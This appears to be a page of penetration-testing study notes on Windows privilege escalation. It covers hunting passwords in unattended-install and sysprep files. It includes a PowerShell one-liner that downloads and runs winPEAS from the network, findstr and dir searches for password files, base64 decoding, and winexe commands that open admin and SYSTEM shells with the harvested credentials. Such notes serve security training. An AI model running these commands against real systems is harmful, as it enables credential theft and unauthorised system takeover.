<!doctype html>
<html>
<head>
  <meta http-equiv="content-type" content="text/html; charset=utf-8">
  <title>manually</title>
  <meta name="generator" content="CherryTree">
  <link rel="stylesheet" href="res/styles4.css" type="text/css" />
</head>
<body>
<div class='page'><h1 class='title'>manually</h1><br/><br />Unattended files are most likely found in one of the following directories:<br />   ◇ C:\Windows\Panther\<br />   ◇ C:\Windows\Panther\Unattend\<br />   ◇ C:\Windows\System32\<br />   ◇ C:\Windows\System32\sysprep\<br />Search the directories for the following files:<br />   → Unattend.xml<br />   → Unattended.xml<br />   → Unattend.txt<br />   → sysprep.xml<br />   → sysprep.inf<br />   → autounattend.txt<br />   → autounattend.xml<br />   → Groups.xml<br /><br /><strong>Search with WinPEAS</strong>: <a href="https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite/raw/master/winPEAS/winPEASexe/binaries/Release/winPEASany.exe">https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite/raw/master/winPEAS/winPEASexe/binaries/Release/winPEASany.exe</a><br />      <div class="codebox"><pre><span style="color:#ff9d00;font-weight:700">PS</span>&gt; (<span style="color:#ff9d00;font-weight:700">new-object</span> System.Net.WebClient).DownloadFile(<span style="color:#3ad900;font-weight:400">&quot;https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite/raw/master/winPEAS/winPEASexe/binaries/Release/winPEASany.exe&quot;</span>, <span style="color:#3ad900;font-weight:400">&quot;$env:userprofile\desktop\winPEASany.exe&quot;</span>);<span style="color:#ff9d00;font-weight:700">Invoke-Expression</span> <span style="color:#3ad900;font-weight:400">&quot;$env:userprofile\desktop\winPEASany.exe quiet cmd filesinfo&quot;</span>;<span style="color:#ff9d00;font-weight:700">Remove-Item</span> <span style="color:#ff9d00;font-weight:700">-</span>Path <span style="color:#3ad900;font-weight:400">&quot;$env:userprofile\desktop\winPEASany.exe&quot;</span>;</pre></div> <br />      <a href=""><img src="images/935-1.png" alt="images/935-1.png" /></a><br />   If we look in the source code of WinPEAS, the list of file name patterns it searches for, is quite long... Sometime anyway is easier to search for files<br />    <br /><strong>Search for Unattended Installs</strong><br />To search these files we can use the cmdlet Get-ChildItem(gci)<br />• powershell: search only in the folders more promising<br />    <div class="codebox"><pre><span style="color:#ff9d00;font-weight:700">PS</span>&gt; <span style="color:#ff9d00;font-weight:700">gci</span> <span style="color:#ff9d00;font-weight:700">-</span>Path C<span style="color:#ff9d00;font-weight:700">:\</span>Windows<span style="color:#ff9d00;font-weight:700">\</span>Panther,C<span style="color:#ff9d00;font-weight:700">:\</span>Windows<span style="color:#ff9d00;font-weight:700">\</span>Panther<span style="color:#ff9d00;font-weight:700">\</span>Unattend,C<span style="color:#ff9d00;font-weight:700">:\</span>Windows<span style="color:#ff9d00;font-weight:700">\</span>System32,C<span style="color:#ff9d00;font-weight:700">:\</span>Windows<span style="color:#ff9d00;font-weight:700">\</span>System32<span style="color:#ff9d00;font-weight:700">\</span>sysprep <span style="color:#ff9d00;font-weight:700">-</span>Include <span style="color:#ff9d00;font-weight:700">*</span>sysprep.inf,<span style="color:#ff9d00;font-weight:700">*</span>sysprep.<span style="color:#7f0044;font-weight:400">xml</span>,<span style="color:#ff9d00;font-weight:700">*</span>sysprep.txt,<span style="color:#ff9d00;font-weight:700">*</span>unattended.<span style="color:#7f0044;font-weight:400">xml</span>,<span style="color:#ff9d00;font-weight:700">*</span>unattend.<span style="color:#7f0044;font-weight:400">xml</span>,<span style="color:#ff9d00;font-weight:700">*</span>unattend.txt <span style="color:#ff9d00;font-weight:700">-</span>File <span style="color:#ff9d00;font-weight:700">-</span>Recurse <span style="color:#ff9d00;font-weight:700">-</span>EA SilentlyContinue</pre></div><br />    <a href=""><img src="images/935-2.png" alt="images/935-2.png" /></a><br />• powershell: search in all the C:\ drive<br />    <div class="codebox"><pre><span style="color:#ff9d00;font-weight:700">PS</span>&gt; <span style="color:#ff9d00;font-weight:700">gci</span> <span style="color:#ff9d00;font-weight:700">-</span>Path C<span style="color:#ff9d00;font-weight:700">:\</span> <span style="color:#ff9d00;font-weight:700">-</span>Include <span style="color:#ff9d00;font-weight:700">*</span>sysprep.inf,<span style="color:#ff9d00;font-weight:700">*</span>sysprep.<span style="color:#7f0044;font-weight:400">xml</span>,<span style="color:#ff9d00;font-weight:700">*</span>sysprep.txt,<span style="color:#ff9d00;font-weight:700">*</span>unattended.<span style="color:#7f0044;font-weight:400">xml</span>,<span style="color:#ff9d00;font-weight:700">*</span>unattend.<span style="color:#7f0044;font-weight:400">xml</span>,<span style="color:#ff9d00;font-weight:700">*</span>unattend.txt,<span style="color:#ff9d00;font-weight:700">*</span>autounattend.txt,<span style="color:#ff9d00;font-weight:700">*</span>autounattend.<span style="color:#7f0044;font-weight:400">xml</span>,<span style="color:#ff9d00;font-weight:700">*</span>Groups.<span style="color:#7f0044;font-weight:400">xml</span> <span style="color:#ff9d00;font-weight:700">-</span>File <span style="color:#ff9d00;font-weight:700">-</span>Recurse <span style="color:#ff9d00;font-weight:700">-</span>EA SilentlyContinue</pre></div><br />    <span style="text-decoration:underline;">Note</span>: Passwords in these files may be base64 encoded<br />    <a href=""><img src="images/935-3.png" alt="images/935-3.png" /></a><br /><br /><strong>Search for general Configuration files</strong><br />The following commands are not advised to be run in the root directory. It is better run them in directories that we might think are important, such:<br />   ◇ current user home directory (cd %userprofile%)<br />   ◇ temporary directory (cd %temp%)<br />   ◇ directory of a suspicious program<br />   ◇ ...<br />• search for files with “pass” in the name, or ending in “.config”<br />    <div class="codebox"><pre>C<span style="color:#ff9d00;font-weight:700">:</span><span style="color:#333333;font-weight:400">\&gt;</span> <span style="color:#ff9d00;font-weight:700">cd</span> %userprofile% <span style="color:#ff9d00;font-weight:700">&amp;</span> <span style="color:#ff9d00;font-weight:700">dir</span> <span style="color:#ff9d00;font-weight:700">/</span>s *pass* == *.config <span style="color:#ff9d00;font-weight:700">&amp;</span> <span style="color:#ff9d00;font-weight:700">cd</span> %temp% <span style="color:#ff9d00;font-weight:700">&amp;</span> <span style="color:#ff9d00;font-weight:700">dir</span> <span style="color:#ff9d00;font-weight:700">/</span>s *pass* == *.config</pre></div><br />• Recursively search that contain the word “password” and also end in either .xml, .ini or .txt:<br />    <div class="codebox"><pre>C<span style="color:#ff9d00;font-weight:700">:</span><span style="color:#333333;font-weight:400">\&gt;</span> <span style="color:#ff9d00;font-weight:700">cd</span> %userprofile% <span style="color:#ff9d00;font-weight:700">&amp;</span> findstr <span style="color:#ff9d00;font-weight:700">/</span>si password *.xml *.ini *.txt <span style="color:#ff9d00;font-weight:700">&amp;</span> <span style="color:#ff9d00;font-weight:700">cd</span> %temp% <span style="color:#ff9d00;font-weight:700">&amp;</span> findstr <span style="color:#ff9d00;font-weight:700">/</span>si password *.xml *.ini *.txt</pre></div><br /><br /><br />------------------------------------------------------------------------------------------------------------------<br /><strong>Print content of a file</strong><br /><div class="codebox"><pre>C<span style="color:#ff9d00;font-weight:700">:</span><span style="color:#333333;font-weight:400">\&gt;</span> <span style="color:#ff9d00;font-weight:700">type</span> &lt;<span style="color:#ff9d00;font-weight:700">file</span>&gt;</pre></div><br />    <a href=""><img src="images/935-4.png" alt="images/935-4.png" /></a><br /><strong>Decode base64</strong><br /><div class="codebox"><pre>root@kali<span style="color:#ff9d00;font-weight:700">:/</span># <span style="color:#ff9d00;font-weight:700">echo</span> <span style="color:#3ad900;font-weight:400">&quot;cGFzc3dvcmQxMjM=&quot;</span> <span style="color:#ff9d00;font-weight:700">|</span> base64 -d</pre></div><br />    <a href=""><img src="images/935-5.png" alt="images/935-5.png" /></a><br /><strong>Winexe: spawn a shell with credentials via SMB(port 445)</strong><br />winexe command to spawn a shell using these credentials:<br />    <div class="codebox"><pre>root@kali<span style="color:#ff9d00;font-weight:700">:/</span># winexe -U <span style="color:#3ad900;font-weight:400">&#39;admin%password123&#39;</span> <span style="color:#ff9d00;font-weight:700">//</span>192.168.147.210 cmd.exe<br />C<span style="color:#ff9d00;font-weight:700">:</span><span style="color:#333333;font-weight:400">\&gt;</span> net localgroup administrators    <span style="color:#0088ff;font-weight:400">#to check if the user is a local administrator</span></pre></div><br />    <a href=""><img src="images/935-6.png" alt="images/935-6.png" /></a><br />    since this user is an an admin, we can also have a SYSTEM shell with these credentials<br />    <div class="codebox"><pre>root@kali<span style="color:#ff9d00;font-weight:700">:/</span># winexe -U <span style="color:#3ad900;font-weight:400">&#39;admin%password123&#39;</span> --system <span style="color:#ff9d00;font-weight:700">//</span>192.168.147.210 cmd.exe</pre></div><br />    <a href=""><img src="images/935-7.png" alt="images/935-7.png" /></a><br /><br /><br /></div>
</body>
</html>
